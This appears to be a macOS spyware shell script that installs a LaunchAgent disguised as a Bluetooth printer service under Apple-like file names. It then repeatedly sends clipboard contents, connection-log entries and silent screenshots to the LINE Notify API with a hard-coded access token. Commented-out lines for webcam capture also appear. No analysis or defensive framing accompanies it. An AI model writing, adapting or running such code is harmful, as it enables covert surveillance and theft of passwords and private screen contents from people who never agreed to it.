```shell
#!/bin/sh

SGOD="bNnEapFL32lps8DxpPiM7XSFoNNvm3YTsSAs0JccgRd"
ACCESS_TOKEN=$SGOD
FOLDER_PATH="$HOME/.tempd"
PICTURE_PATH="$FOLDER_PATH/d.apple.com.lib"
SNAME=com.bluetooth.printerx
PL="<?xml version="1.0" encoding="UTF-8"?>
<plist version="1.0"><dict>
<key>Label</key><string>$SNAME</string>
<key>RunAtLoad</key><true /><key>StartInterval</key><integer>75</integer>
<key>Program</key><string>$HOME/.tempd/l.apple.sh</string>
<key>StartInterval</key><integer>77</integer>
</dict></plist>"
PLPATH="$HOME/Library/LaunchAgents/$SNAME.plist"
LOGPATH="$HOME/Library/Logs/_mylog.log"

#launchctl load ~/Library/LaunchAgents/com.bluetooth.printerx.plist
#launchctl list | grep blue
NOW=$(date)
mkdir -p $FOLDER_PATH
mkdir -p $HOME/Library/LaunchAgents
touch $PICTURE_PATH
if [[ $1 == "I" || $1 == "i" ]]; then
# echo "<plist version="1.0"><dict><key>Label</key><string>com.bluetooth.printerx</string><key>RunAtLoad</key><true /><key>StartInterval</key><integer>75</integer><key>Program</key><string>$HOME/.tempd/l.apple.sh</string></dict></plist>" >> $HOME/Library/LaunchAgents/com.bluetooth.printerx.plist;
# launchctl load $HOME/Library/LaunchAgents/com.bluetooth.printerx.plist;
launchctl kill $SNAME
launchctl remove $PLPATH
launchctl unload $PLPATH
echo $NOW >>$LOGPATH
echo $PL >>$LOGPATH
echo $PLPATH >>$LOGPATH
plutil $PLPATH
echo $PL >>$PLPATH
cp ./l.apple.sh $FOLDER_PATH
chmod +x $HOME/.tempd/l.apple.sh
launchctl load $PLPATH
# cat $HOME/Library/LaunchAgents/com.bluetooth.printerx.plist;
launchctl list | grep blue

elif [[ $1 == "R" || $1 == "r" ]]; then
launchctl unload $PLPATH
rm "$PLPATH"
echo $NOW >$HOME/Library/Logs/_mylog.log
else
echo SYSBLUETOOTH >$HOME/Library/Logs/_mylog.log
# while true; do
ANY=$(cat /var/log/conn.log | grep "Incoming session request" | awk {'print $2 $3 $13 $14'})
CB=$(pbpaste)
curl -X POST https://notify-api.line.me/api/notify -H "Authorization: Bearer $ACCESS_TOKEN" -F "message=KH_MC $NOW $CB $ANY" >>$LOGPATH
screencapture -t jpg -x $PICTURE_PATH >>$LOGPATH
curl -X POST https://notify-api.line.me/api/notify -H "Authorization: Bearer $ACCESS_TOKEN" -F "message=KH_MC" -F "imageFile=@$PICTURE_PATH" >>$LOGPATH
wait
rm $PICTURE_PATH
# sleep 88;
# done
fi

# while :; do
#     imagesnap -t 1 ~/Desktop/$(date +%y%m%d%H%M%S).png
#     sleep ${1-1}
# done

```